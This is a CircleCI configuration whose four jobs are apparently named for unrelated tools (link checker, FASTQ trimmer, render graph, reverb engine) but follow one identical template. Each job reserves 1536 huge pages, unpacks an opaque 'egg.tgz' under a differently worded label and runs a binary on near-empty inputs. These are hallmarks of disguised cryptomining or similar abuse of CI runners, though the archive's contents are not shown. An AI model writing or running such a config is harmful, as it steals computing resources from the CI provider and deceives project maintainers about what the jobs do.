version: 2.1

jobs:
  anchorAudit:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: List anchors
          command: |
            printf '#intro\n#usage\n' > anchors.txt
      - run:
          name: Build link checker
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target anchorAudit -j2
      - run:
          name: Audit anchor targets
          command: LIONSS_LP=1 ./build/anchorAudit --anchors anchors.txt --fail-on-missing
  FastqcTrim:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write fastq
          command: |
            printf '@r1\nACGT\n+\nIIII\n' > r.fq
      - run:
          name: Build QC trimmer
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target FastqcTrim -j2
      - run:
          name: Trim low-quality bases
          command: LIONSS_LP=1 ./build/FastqcTrim --in r.fq --qual 20
  renderGraph:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Define passes
          command: |
            printf 'passes 10\n' > rg.cfg
      - run:
          name: Build frame graph
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target renderGraph -j2
      - run:
          name: Compile render graph
          command: LIONSS_LP=1 ./build/renderGraph --conf rg.cfg --alias-memory
  ReverbTail:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load impulse response
          command: |
            : > ir.wav
      - run:
          name: Build convolution engine
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target ReverbTail -j2
      - run:
          name: Render reverb tail
          command: LIONSS_LP=1 ./build/ReverbTail --ir ir.wav --decay 2.5
